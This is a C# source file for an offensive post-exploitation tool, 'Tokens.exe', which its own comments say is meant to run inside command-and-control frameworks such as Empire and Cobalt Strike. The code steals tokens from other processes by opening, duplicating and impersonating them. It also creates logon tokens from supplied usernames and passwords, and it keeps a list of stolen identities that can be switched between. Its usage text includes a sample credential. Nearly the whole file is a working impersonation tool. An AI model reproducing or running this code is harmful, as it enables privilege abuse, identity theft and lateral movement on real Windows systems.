using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;

// Note: this code is meant to be run via some sort of execute-assembly style CLR harness that does *not*
// perform a fork-n-run: (e.g.: Powershell Empire's Invoke-Assembly, Badrat's C# rat csharp command).
// This code performs token context switches in the current process over __multiple Tokens.exe executions__.
// This means if you just run Tokens.exe by itself or in a new process (Coblyat Strike execute-assembly)
// that exits after Tokens.exe completion, it will be effectively useless.

// Written based on code from https://xret2pwn.github.io/Access-Token-Part0x01/
// and https://xret2pwn.github.io/Building-Token-Vault-Part0x02/
// Thanks to pinvoke.net for the Pinvoke structures and functions
public class Program
{
    // pinvoke structs/enums section
    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [Flags]
    public enum ProcessAccessRights
    {
        PROCESS_CREATE_PROCESS = 0x0080,            // Required to create a process.
        PROCESS_CREATE_THREAD = 0x0002,             // Required to create a thread.
        PROCESS_DUP_HANDLE = 0x0040,                // Required to duplicate a handle using DuplicateHandle.
        PROCESS_QUERY_INFORMATION = 0x0400,         // Required to retrieve certain information about a process, such as its token, exit code, and priority class (see OpenProcessToken, GetExitCodeProcess, GetPriorityClass, and IsProcessInJob).
        PROCESS_QUERY_LIMITED_INFORMATION = 0x1000, // Required to retrieve certain information about a process (see QueryFullProcessImageName). A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION. Windows Server 2003 and Windows XP/2000:  This access right is not supported.
        PROCESS_SET_INFORMATION = 0x0200,           // Required to set certain information about a process, such as its priority class (see SetPriorityClass).
        PROCESS_SET_QUOTA = 0x0100,                 // Required to set memory limits using SetProcessWorkingSetSize.
        PROCESS_SUSPEND_RESUME = 0x0800,            // Required to suspend or resume a process.
        PROCESS_TERMINATE = 0x0001,                 // Required to terminate a process using TerminateProcess.
        PROCESS_VM_OPERATION = 0x0008,              // Required to perform an operation on the address space of a process (see VirtualProtectEx and WriteProcessMemory).
        PROCESS_VM_READ = 0x0010,                   // Required to read memory in a process using ReadProcessMemory.
        PROCESS_VM_WRITE = 0x0020,                  // Required to write to memory in a process using WriteProcessMemory.
        DELETE = 0x00010000,                        // Required to delete the object.
        READ_CONTROL = 0x00020000,                  // Required to read information in the security descriptor for the object, not including the information in the SACL. To read or write the SACL, you must request the ACCESS_SYSTEM_SECURITY access right. For more information, see SACL Access Right.
        SYNCHRONIZE = 0x00100000,                   // The right to use the object for synchronization. This enables a thread to wait until the object is in the signaled state.
        WRITE_DAC = 0x00040000,                     // Required to modify the DACL in the security descriptor for the object.
        WRITE_OWNER = 0x00080000,                   // Required to change the owner in the security descriptor for the object.
        STANDARD_RIGHTS_REQUIRED = 0x000f0000,
        PROCESS_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFF), // All possible access rights for a process object.
    }

    struct DesiredAccess // used in OpenProcessToken
    {
        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const UInt32 TOKEN_DUPLICATE = 0x0002;
        public const UInt32 TOKEN_IMPERSONATE = 0x0004;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
        public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
        public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
        public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
            TOKEN_ADJUST_SESSIONID);
    }

    private const int MAXIMUM_ALLOWED = 0x2000000;

    public enum CreationFlags // used with CreateProcessWithTokenW
    {
        DefaultErrorMode = 0x04000000,
        NewConsole = 0x00000010,
        NewProcessGroup = 0x00000200,
        SeparateWOWVDM = 0x00000800,
        Suspended = 0x00000004,
        UnicodeEnvironment = 0x00000400,
        ExtendedStartupInfoPresent = 0x00080000
    }

    public enum LogonFlags // used with CreateProcessWithTokenW
    {
        /// <summary>
        /// Log on, then load the user's profile in the HKEY_USERS registry key. The function
        /// returns after the profile has been loaded. Loading the profile can be time-consuming,
        /// so it is best to use this value only if you must access the information in the
        /// HKEY_CURRENT_USER registry key.
        /// NOTE: Windows Server 2003: The profile is unloaded after the new process has been
        /// terminated, regardless of whether it has created child processes.
        /// </summary>
        /// <remarks>See LOGON_WITH_PROFILE</remarks>
        WithProfile = 1,
        /// <summary>
        /// Log on, but use the specified credentials on the network only. The new process uses the
        /// same token as the caller, but the system creates a new logon session within LSA, and
        /// the process uses the specified credentials as the default credentials.
        /// This value can be used to create a process that uses a different set of credentials
        /// locally than it does remotely. This is useful in inter-domain scenarios where there is
        /// no trust relationship.
        /// The system does not validate the specified credentials. Therefore, the process can start,
        /// but it may not have access to network resources.
        /// </summary>
        /// <remarks>See LOGON_NETCREDENTIALS_ONLY</remarks>
        NetCredentialsOnly = 2
    }

    public enum SECURITY_IMPERSONATION_LEVEL // used in DuplicateTokenEx
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    public enum TOKEN_TYPE // used in DuplicateTokenEx
    {
        TokenPrimary = 1,
        TokenImpersonation
    }

    public enum LogonProvider
    {
        LOGON32_LOGON_INTERACTIVE = 2,
        LOGON32_LOGON_NETWORK = 3,
        LOGON32_LOGON_BATCH = 4,
        LOGON32_LOGON_SERVICE = 5,
        LOGON32_LOGON_UNLOCK = 7,
        LOGON32_LOGON_NETWORK_CLEARTEXT = 8,
        LOGON32_LOGON_NEW_CREDENTIALS = 9
    }

    public enum LogonUserProvider
    {
        LOGON32_PROVIDER_DEFAULT = 0,
        LOGON32_PROVIDER_WINNT35 = 1,
        LOGON32_PROVIDER_WINNT40 = 2,
        LOGON32_PROVIDER_WINNT50 = 3
    }

    enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin
    }

    enum SID_NAME_USE
    {
        SidTypeUser = 1,
        SidTypeGroup,
        SidTypeDomain,
        SidTypeAlias,
        SidTypeWellKnownGroup,
        SidTypeDeletedAccount,
        SidTypeInvalid,
        SidTypeUnknown,
        SidTypeComputer
    }

    public const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;

    // pinvoke functions section
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine,
        ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags,
        string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
        IntPtr lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
        TOKEN_TYPE TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LogonUser(string pszUsername, string pszDomain, string pszPassword,
        LogonProvider dwLogonType, LogonUserProvider dwLogonProvider, out IntPtr phToken);

    [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto,
        CallingConvention = CallingConvention.StdCall)]
    extern static bool CloseHandle(IntPtr handle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation, uint TokenInformationLength, ref int ReturnLength);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern bool LookupAccountSid(string lpSystemName, [MarshalAs(UnmanagedType.LPArray)] byte[] Sid,
        System.Text.StringBuilder lpName, ref uint cchName, System.Text.StringBuilder ReferencedDomainName,
        ref uint cchReferencedDomainName, out SID_NAME_USE peUse);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    public struct TokenEntry
    {
        public IntPtr hToken;
        public WindowsIdentity winId;
        public int pid;

    }

    public static List<TokenEntry> TokenList;

    // functions section
    private static void InitTokenList()
    {
        if(Object.Equals(TokenList, default(List<TokenEntry>))) // uninitialized TokenEntry list
        {
            // Initialize new TokenEntry list
            TokenList = new List<TokenEntry>();
        }
    }
    private static void AddToken(IntPtr hToken, int pid) // used to add a token to the TokenEntry List
    {
        TokenEntry entry = new TokenEntry
        {
            hToken = hToken,
            winId = new WindowsIdentity(hToken),
            pid = pid
        };
        TokenList.Add(entry);
    }
    private static void ListTokens()
    {
        int index = 1;
        if (TokenList.Count == 0)
        {
            Console.WriteLine("No tokens available!");
        }
        else
        {
            Console.WriteLine("Index   PID       SID                                             UserName");
            Console.WriteLine("=====   =======   =============================================   ========");
            foreach (TokenEntry entry in TokenList)
            {
                Console.Write(index + new String(' ', 8 - index.ToString().Length));
                Console.Write(entry.pid + new String(' ', 10 - entry.pid.ToString().Length));
                Console.Write(entry.winId.User + new String(' ', 48 - entry.winId.User.ToString().Length));
                Console.WriteLine(entry.winId.Name);

                index++;
            }
        }
    }
    private static bool UseToken(int index)
    {
        if(index > TokenList.Count || index < 1)
        {
            Console.WriteLine("Invalid token index - out of range: 1 - " + TokenList.Count);
            return false;
        }
        IntPtr hToken = TokenList[index - 1].hToken;
        Rev2Self();
        if (!ImpersonateLoggedOnUser(hToken))
        {
            Console.WriteLine("ImpersonateLoggedOnUser failed for token #" + index + ": " + Marshal.GetLastWin32Error());
            CloseHandle(hToken);
            return false;
        }
        Console.WriteLine("Switched to token #" + index);
        return true;
    }
    private static bool MakeToken(string domain, string username, string password)
    {
        if(!LogonUser(username, domain, password, LogonProvider.LOGON32_LOGON_INTERACTIVE,
            LogonUserProvider.LOGON32_PROVIDER_DEFAULT, out var hToken))
        {
            Console.WriteLine("Error: Couldn't LogonUser with username:password \""
                + domain + "\\" + username + ":" + password + "\"" + " Error: " + Marshal.GetLastWin32Error());
            return false;
        }

        Rev2Self();
        if(!ImpersonateLoggedOnUser(hToken))
        {
            Console.WriteLine("Succesfully made token, but ImpersonateLoggedOnUser failed: " + Marshal.GetLastWin32Error());
            CloseHandle(hToken);
            return false;
        }
            
        AddToken(hToken, 0); // Add the token we made to the Token List...
        Console.WriteLine("Successfully made token with username:password \"" + domain + "\\" + username + ":" + password + "\"");
        return true;
    }
    private static bool StealToken(int pid)
    {
        Process process = null;
        IntPtr processHandle = IntPtr.Zero;
        IntPtr tokenHandle = IntPtr.Zero;
        IntPtr dupTokenHandle = IntPtr.Zero;
        try
        {
            process = Process.GetProcessById(pid);
        }
        catch
        {
            Console.WriteLine("No process of pid " + pid.ToString() + " exists!");
            return false;
        }

        processHandle = OpenProcess((uint)ProcessAccessRights.PROCESS_QUERY_LIMITED_INFORMATION, false, (uint)pid);
        if(processHandle == IntPtr.Zero)
        {
            Console.WriteLine("Error: Couldn't OpenProcess to pid " + pid.ToString() + " Error: " + Marshal.GetLastWin32Error());
            return false;
        }

        if(!OpenProcessToken(processHandle, DesiredAccess.TOKEN_QUERY | 
            DesiredAccess.TOKEN_DUPLICATE | DesiredAccess.TOKEN_IMPERSONATE,
            out tokenHandle))
        {
            Console.WriteLine("Error: Couldn't OpenProcessToken to pid " + pid.ToString() + " Error: " + Marshal.GetLastWin32Error());
            return false;
        }
            
        if(!DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, IntPtr.Zero,
            SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary,
            out dupTokenHandle))
        {
            Console.WriteLine("Could not DuplicateTokenEx of pid " + pid.ToString() + " Error: " + Marshal.GetLastWin32Error());
            return false;
        }

        if(!ImpersonateLoggedOnUser(dupTokenHandle))
        {
            Console.WriteLine("Could not ImpersonateLoggedOnUser for pid " + pid.ToString() + " Error: " + Marshal.GetLastWin32Error());
            return false;
        }

        AddToken(dupTokenHandle, pid); // Add the token we made to the Token List...
        Console.WriteLine("Successfully impersonated token from pid " + pid.ToString());
        return true;
    }
    private static bool Rev2Self()
    {
        return RevertToSelf();
    }
    private static string GetCurrentTokenUser()
    {
        return WindowsIdentity.GetCurrent().Name;
    }
    private static void usage()
    {
        Console.WriteLine("Usage:   Tokens.exe <function> [args]\n");
        Console.WriteLine("Usage:   Tokens.exe steal_token <pid>");
        Console.WriteLine("Usage:   Tokens.exe make_token <domain> <username> <password>");
        Console.WriteLine("Usage:   Tokens.exe list_tokens");
        Console.WriteLine("Usage:   Tokens.exe use_token <token_id>");
        Console.WriteLine("Usage:   Tokens.exe whoami");
        Console.WriteLine("Usage:   Tokens.exe rev2self\n");
        Console.WriteLine("Example: Tokens.exe steal_token 4468");
        Console.WriteLine("Example: Tokens.exe make_token borgar kclark Summer2019!");
        Console.WriteLine("Example: Tokens.exe list_tokens");
        Console.WriteLine("Example: Tokens.exe use_token 3");
        Console.WriteLine("Example: Tokens.exe whoami");
        Console.WriteLine("Example: Tokens.exe rev2self");
    }
    public static int Main(string[] args)
    {
        InitTokenList();

        if (args.Length < 1 || args[0] == "/help" || args[0] == "/h" || args[0] == "/?" || args[0] == "-help" || args[0] == "-h" || args[0] == "--help")
        {
            usage();
        }

        else if(args[0] == "steal_token")
        {
            if(int.TryParse(args[1], out int pid))
            {
                if(StealToken(pid))
                {
                    Console.WriteLine("Current user after impersonation: " + GetCurrentTokenUser());
                }
            }
            else
            {
                Console.WriteLine("Could not parse PID (" + args[1] + ") as an integer");
            }
        }
        else if(args[0] == "make_token" && args.Length == 4)
        {
            string domain = args[1];
            string username = args[2];
            string password = args[3];
            if(MakeToken(domain, username, password))
            {
                Console.WriteLine("Current user after token creation: " + GetCurrentTokenUser());
            }
        }
        else if(args[0] == "list_tokens")
        {
            ListTokens();
        }
        else if(args[0] == "use_token")
        {
            if (int.TryParse(args[1], out int index))
            {
                if(UseToken(index))
                {
                    Console.WriteLine("Current user after switching tokens: " + GetCurrentTokenUser());
                }
            }
            else
            {
                Console.WriteLine("Could not parse index (" + args[1] + ") as an integer");
            }
        }
        else if (args[0] == "whoami")
        {
            Console.WriteLine(GetCurrentTokenUser());
        }
        else if (args[0] == "rev2self")
        {
            Rev2Self();
            Console.WriteLine("Current user after rev2self: " + GetCurrentTokenUser());
        }
        else if(args[0] == "interactive") // Used for testing only
        {
            while(true)
            {
                Console.Write("Input > ");
                string[] input = Console.ReadLine().Split(' ');
                Main(input);
            }
        }
        else
        {
            usage();
        }
        return 0;
    }
}

